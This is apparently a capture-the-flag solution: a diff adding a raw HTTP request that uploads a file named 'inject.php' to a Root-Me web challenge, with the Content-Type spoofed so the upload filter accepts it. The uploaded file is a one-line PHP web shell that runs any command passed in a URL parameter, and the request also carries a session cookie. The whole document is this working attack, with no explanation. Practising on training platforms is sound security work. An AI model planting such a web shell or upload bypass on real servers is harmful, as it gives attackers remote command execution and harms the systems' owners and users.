@@ -1,0 +1,23 @@
+POST /web-serveur/ch22/?action=upload HTTP/1.1
+Host: challenge01.root-me.org
+Content-Length: 225
+Cache-Control: max-age=0
+Origin: http://challenge01.root-me.org
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2ZFWQ2qwhBHeQUUq
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://challenge01.root-me.org/web-serveur/ch22/?action=upload
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=ndh7prqj4bpnaeiofas3e01k51
+Connection: close
+
+------WebKitFormBoundary2ZFWQ2qwhBHeQUUq
+Content-Disposition: form-data; name="file"; filename="inject.php"
+Content-Type: application/x-php
+
+<?php
+system($_GET['command']);
+?>
+------WebKitFormBoundary2ZFWQ2qwhBHeQUUq--
